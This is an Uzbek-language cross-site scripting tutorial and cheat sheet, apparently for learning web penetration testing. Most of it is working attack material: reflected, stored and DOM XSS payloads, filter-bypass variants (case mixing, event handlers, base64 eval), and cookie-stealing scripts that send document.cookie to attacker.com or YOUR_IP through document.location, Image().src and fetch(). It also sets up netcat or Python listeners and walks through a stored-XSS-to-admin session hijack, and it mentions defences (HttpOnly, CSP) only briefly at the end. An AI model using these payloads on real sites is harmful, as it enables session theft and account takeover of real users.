# 💻 XSS (Cross-Site Scripting — Saytlararo Skript)

> **Maqsad:** Veb-sahifaga zararli JavaScript kodi kiritib, boshqa foydalanuvchilar brauzerida ishlatish.

---

## 📖 Asosiy Tushunchalar

### XSS nima?
Hujumchi JavaScript kodini sahifaga kiritadi. Boshqa foydalanuvchi o'sha sahifani ochganda, kod uning brauzerida ishlaydi.

**Nima qilish mumkin:**
- Cookie o'g'irlash (session hijacking — sessiya o'g'irlash)
- Keylogger (tugmalar bosishini yozib olish)
- Sahifani o'zgartirish (defacement)
- Foydalanuvchini boshqa saytga yo'naltirish
- Phishing (fishing — hiyla) sahifalar ko'rsatish

### 3 tur XSS:

| Tur | Nomi | Ma'nosi |
|-----|------|---------|
| **Reflected** | Aks etuvchi | Payload URL da bo'ladi, faqat o'sha foydalanuvchiga ta'sir |
| **Stored** | Saqlangan | Payload bazaga saqlanadi, hamma ko'radi |
| **DOM-based** | DOM asosidagi | JavaScript DOM ni o'zgartiradi |

---

## 🔍 XSS Turlari

### 1. Reflected XSS (Aks Etuvchi)
Payload URL da bo'ladi. Qurbonga URL yuboriladi.

```
# Zaif URL:
https://target.com/search?q=hello
# Natija: "Qidiruv: hello" deb chiqaradi

# Hujum:
https://target.com/search?q=<script>alert('XSS')</script>
# Natija: "Qidiruv: " + alert paydo bo'ladi

# Cookie o'g'irlovchi:
https://target.com/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### 2. Stored XSS (Saqlangan) — Eng Xavfli
Payload bazaga saqlanadi. Hamma foydalanuvchi ko'radi.

```
# Izoh yoki post formasi:
# Matn maydoniga:
<script>alert('XSS')</script>

# Cookie o'g'irlovchi:
<script>
  new Image().src="http://attacker.com/steal?cookie="+document.cookie;
</script>
```

### 3. DOM-based XSS
JavaScript DOM ni o'zgartiradi, server javobida kod yo'q.

```javascript
// Zaif JavaScript kodi:
document.getElementById("output").innerHTML = location.search.split('q=')[1];

// URL:
https://target.com/#<img src=x onerror=alert(1)>
```

---

## 🧪 XSS Test Payloadlari

### Asosiy sinov:
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

### Filtrlarni chetlab o'tish:
```html
<!-- script tegi filtrilgan bo'lsa -->
<img src=x onerror=alert(1)>
<img src="x" onerror="alert('XSS')">
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click me</a>

<!-- Katta/kichik harf aralash -->
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>

<!-- Kodlangan -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- YWxlcnQoMSk= = base64("alert(1)") -->

<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

### Murakkab filtr bypass:
```html
<!-- " va ' filtrilgan bo'lsa -->
<img src=x onerror=alert`1`>

<!-- Boʻsh joy filtrilgan -->
<img/src=x/onerror=alert(1)>

<!-- JavaScript protokol -->
<a href=javascript:alert(1)>test</a>
```

---

## 🍪 Cookie O'g'irlash (Session Hijacking)

```html
<!-- 1. O'z serveringizda tinglovchi: -->
<!-- Python: -->
python3 -m http.server 8000
<!-- Yoki netcat: -->
nc -lvnp 8000

<!-- 2. Payload: -->
<script>
  document.location='http://YOUR_IP:8000/steal?c='+encodeURIComponent(document.cookie)
</script>

<!-- Qisqaroq: -->
<script>fetch('http://YOUR_IP:8000/?c='+btoa(document.cookie))</script>

<!-- Yashirin (img tag bilan): -->
<img src="http://YOUR_IP:8000/?c="+document.cookie>
```

---

## 🔎 XSS Topish

### Nishon joylar:
```
- Qidiruv maydonlari
- Izoh yoki post formaslar
- Profil (ism, familiya, bio)
- URL parametrlari (?name=, ?msg=, ?error=)
- Xato xabarlar
- Email maydonlari
- 404 xato sahifasi
```

### Tekshirish:
```bash
# URL parametrlarini sinab ko'ring:
https://target.com/search?q=<script>alert(1)</script>
https://target.com/profile?name=<img src=x onerror=alert(1)>

# POST forma orqali (Burp Suite):
POST /comment
body: text=<script>alert(1)</script>

# Header orqali (kam uchraydi):
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

---

## 🛡️ XSS Filtirlarini Sinovdan O'tkazish

```
1. <script>alert(1)</script>           → Eng oddiy
2. <img src=x onerror=alert(1)>        → Event handler
3. "><script>alert(1)</script>          → Attribut dan chiqish
4. '><script>alert(1)</script>          → Yagona tirnoq
5. javascript:alert(1)                  → href qiymatida
6. <svg/onload=alert(1)>               → SVG
7. \"><img src=x onerror=alert(1)>     → Backslash + tirnoq
```

---

## 🎯 Amaliy Misol: Stored XSS → Cookie O'g'irlash

```bash
# 1-qadam: O'z serveringizni boshlang
python3 -m http.server 8080

# 2-qadam: XSS uchun joy toping
# Blog izohi, profil nomi va h.k.

# 3-qadam: Payload yuboring
# Izoh maydoniga:
<script>
  var img = new Image();
  img.src = "http://YOUR_IP:8080/steal?cookie=" + encodeURIComponent(document.cookie);
</script>

# 4-qadam: Boshqa foydalanuvchi (admin) sahifani ochganda
# Sizning serveringizda ko'rarsiz:
# GET /steal?cookie=session=abc123def456 HTTP/1.1

# 5-qadam: Sessionni ishlatish
# Brauzerda F12 → Application → Cookies
# session qiymatini o'zgartiring → admin sifatida kirish!
```

---

## 💡 Eslab Qolish Uchun

| Tur | Qaerda | Ta'sir |
|-----|--------|--------|
| Reflected | URL | Faqat o'sha foydalanuvchi |
| Stored | Baza | Barcha foydalanuvchilar |
| DOM-based | JS kodi | Faqat o'sha foydalanuvchi |

**Tez payload lar:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

- **HttpOnly** cookie = JavaScript o'qiy olmaydi → XSS cookie o'g'irlash ishlamaydi
- **CSP** (Content Security Policy) = tashqi skriptlarni bloklaydi
- Filtr bypass: katta/kichik harf, event handlerlar, Base64
- Cookie o'g'irlash → `document.location=` yoki `fetch()` + o'z server
